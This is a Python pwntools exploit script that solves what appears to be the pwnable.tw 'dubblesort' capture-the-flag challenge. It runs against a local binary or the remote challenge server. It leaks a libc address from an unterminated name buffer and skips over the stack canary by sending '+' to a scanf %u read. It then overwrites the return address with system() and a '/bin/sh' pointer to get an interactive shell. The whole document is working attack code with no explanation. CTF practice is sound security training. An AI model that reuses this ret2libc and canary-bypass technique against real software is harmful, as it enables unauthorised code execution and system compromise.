from pwn import *

local = True

if local:
    p = process("./dubblesort")
    #g = gdb.attach(p,"b *0x56555AF9\nb *0x565ADB16")
else:
    p = remote("chall.pwnable.tw",10101)

libc_path = './libc_32.so.6'

log.info("[LIBC] Loading Libc: [%s]"%libc_path)

libc = ELF(libc_path)

libc_on_exit = libc.symbols["on_exit"] # 0xF7F97E24

log.info("[LIBC] Libc on_exit address [0x%s]"%libc_on_exit)

system_address = libc.symbols['system']

log.info("[LIBC] Libc System address [0x%s]"%system_address)

binsh_address= next(libc.search('/bin/sh'))

log.info("[LIBC] /bin/sh in Libc address [0x%s]"%binsh_address)

log.info("[LEAK] Going to Leak the Libc base address.")

p.recvuntil("What your name :")

leaker = "A"*11 + "\n"

log.info("[LEAK] The leaker is %d bytes"%len(leaker))

log.info("[LEAK] Sending the leaker [\\x%s]"%'\\x'.join(x.encode('hex') for x in leaker))

p.send(leaker)

p.recvuntil("Hello ")

leak = p.recvuntil(",").split("\n")[1][:4]

log.info("[LEAK] The leaked String          is:\t[%s]"%leak)

leak = u32(leak)

log.info("[LEAK] The leaked on_exit address is:\t[0x%x]"%leak)

libc_base_address = leak - libc_on_exit

log.info("[LEAK] The Libc Base addrss       is:\t[0x%x]"%libc_base_address)
    
system_address += libc_base_address

log.info("[LEAK] So the system is at [0x%x]"%system_address)

binsh_address += libc_base_address

log.info("[LEAK] So the /bin/sh string is at [0x%x]"%binsh_address)

p.recvuntil("sort :")

padding = 0x9 #8 + int(64/4) # num_buffer + char_buffer + base_add 

numbers_to_sort = padding + 1 + 8 + 3 # padding + canary + system setup + binsh

log.info("[BUFF_OVER] Going to input %d numbers"%numbers_to_sort)

p.sendline(str(numbers_to_sort))

log.info("[BUFF_OVER] Sending %d zeros so the stack canary is the last."%padding)

for _ in range(padding):
    p.recvuntil(":")
    p.sendline("0") 

# Bypass stack canary

log.info("[BUFF_OVER] Sending + to let the stack canary unchanged.")

p.recvuntil(":")
p.sendline("+") # + is accepted by %u but it does not write anything in the memory (Canary Bypass yay)

log.info("[BUFF_OVER] Writing the ret addres to sytem.")

for _ in range(8):
    p.recvuntil(":")
    p.sendline(str(system_address))

log.info("[BUFF_OVER] Writing the /bin/sh as the arguments of system.")

for _ in range(3):
    p.recvuntil(":")
    p.sendline(str(binsh_address))

p.interactive()